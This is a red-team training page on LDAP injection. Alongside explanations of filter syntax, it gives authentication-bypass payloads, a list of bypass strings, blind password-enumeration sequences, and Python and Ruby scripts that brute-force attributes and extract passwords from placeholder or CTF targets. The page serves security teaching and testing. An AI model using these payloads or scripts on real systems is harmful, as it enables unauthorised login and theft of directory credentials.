---
layout: training-page
title: "LDAP Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - ldap
  - injection
  - authentication-bypass
  - blind-injection
  - directory-services
page_key: "web-ldap-injection"
render_with_liquid: false
---

# LDAP Injection

LDAP (Lightweight Directory Access Protocol) is widely used in enterprise environments for authentication and directory services (Active Directory, OpenLDAP). LDAP injection occurs when user-supplied input is inserted into LDAP filter queries without proper sanitization or escaping, allowing attackers to manipulate query logic to bypass authentication or extract directory data.

## How LDAP Queries Work

LDAP filters use a prefix notation with parentheses. A typical authentication query looks like:

```
(&(uid=USERNAME)(userPassword=PASSWORD))
```

The `&` is a logical AND — both conditions must match. If either can be manipulated, authentication can be bypassed.

## Authentication Bypass

Inject logical operators to make the filter always evaluate to true regardless of the actual credentials.

### Example 1 — Always-True Injection

Payload injected into the username field:

```
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

The injected filter terminates the original AND condition early and introduces an OR that matches any uid, bypassing the password check.

### Example 2 — Negation Bypass

```
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

The `!(&(1=0)(...)))` evaluates as NOT(FALSE AND anything) = NOT(FALSE) = TRUE, so the password check is negated.

### Common Authentication Bypass Strings

```
# Username field payloads
*
*)(&
*))%00
admin*
admin)(&(password=*
*)(|(uid=*

# Password field payloads
*)
*))
*)(uid=*))(|(uid=*
invalid_pass)(|(uid=*
```

## Blind LDAP Injection

When the server does not reveal error messages but responds differently depending on whether a condition matches, use character-by-character brute-forcing similar to blind SQL injection. The technique relies on the fact that wildcard patterns like `M*` match any string starting with M.

### Step-by-Step Blind Enumeration

```
(&(sn=administrator)(password=*))    : OK   -- password exists, any value
(&(sn=administrator)(password=A*))   : KO   -- doesn't start with A
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK   -- starts with M
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK   -- starts with MY
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK   -- full match found
```

Continue incrementally until you get an exact match (no wildcard at end returns OK).

## LDAP Filter Operators Reference

- `&` — Logical AND — all conditions must be true
- `|` — Logical OR — any condition must be true
- `!` — Logical NOT — condition must be false
- `*` — Wildcard — matches any string
- `=` — Equality match
- `>=` — Greater than or equal
- `<=` — Less than or equal
- `~=` — Approximate match

## Default LDAP Attributes to Target

These standard attributes are present in most LDAP directories. Use them in injections like `*)(ATTRIBUTE=*` to probe for their existence:

```
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
uid
memberOf
description
telephoneNumber
distinguishedName
```

## Exploiting the userPassword Attribute

Unlike string attributes, `userPassword` is an OCTET STRING. MongoDB-style comparison operators do not apply. Instead, use the OID-based ordering rule `octetStringOrderingMatch` (OID 2.5.13.18) for byte-by-byte comparison:

```
# Test if the first byte of userPassword is \xx (replace with hex byte values)
userPassword:2.5.13.18:=\xx
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

This performs a big-endian bit-by-bit comparison, allowing you to enumerate password bytes one at a time based on less-than/greater-than responses.

## Scripts

### Discover Valid LDAP Attributes

Brute-force which LDAP attributes exist on the directory by testing injections of the form `*)(ATTRIBUTE=*))`:

```
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'

with open('ldap-attributes.txt', 'r') as f:
    wordlist = f.read().split('\n')

for attr in wordlist:
    # Inject: (&(login=*)(ATTR=*))\x00)(password=bla))
    payload = '*)('+str(attr)+'=*))\x00'
    r = requests.post(url, data={'login': payload, 'password': 'bla'})
    if 'TRUE CONDITION' in r.text:
        fields.append(str(attr))
        print(f"[+] Valid attribute: {attr}")

print(fields)
```

### Blind LDAP Injection — Password Extraction (Python)

```
#!/usr/bin/python3
import requests
import string

alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
flag = ""

for i in range(50):
    print("[i] Looking for character " + str(i))
    for char in alphabet:
        r = requests.get(
            "http://ctf.web?action=dir&search=admin*)(password=" + flag + char
        )
        if "TRUE CONDITION" in r.text:
            flag += char
            print("[+] Found: " + flag)
            break
```

### Blind LDAP Injection — Password Extraction (Ruby)

```
#!/usr/bin/env ruby
require 'net/http'

alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
flag = ''

(0..50).each do |i|
  puts "[i] Looking for character #{i}"
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts "[+] Found: #{flag}"
      break
    end
  end
end
```

## Detection

Signs of a vulnerable LDAP injection point:

- Application uses LDAP for authentication (common in enterprise/internal apps)
- Injecting `*` into the username field logs you in as the first user in the directory
- Injecting `)(` or `*)(&` causes an LDAP error or unexpected behavior
- LDAP error messages visible in the response (e.g., `Invalid DN syntax`)

## Resources

- PayloadsAllTheThings — LDAP Injection — `github.com/swisskyrepo/PayloadsAllTheThings`
- LDAP Injection Prevention Cheat Sheet — OWASP — `owasp.org/www-community/attacks/LDAP_Injection`
- LDAP Injection and Blind LDAP Injection — Chema Alonso — `blackhat.com/presentations/bh-europe-08/Alonso-Parada`
- LDAP Blind Explorer — Alonso Parada — `code.google.com/p/ldap-blind-explorer`
- Root Me — LDAP injection Authentication — `root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication`
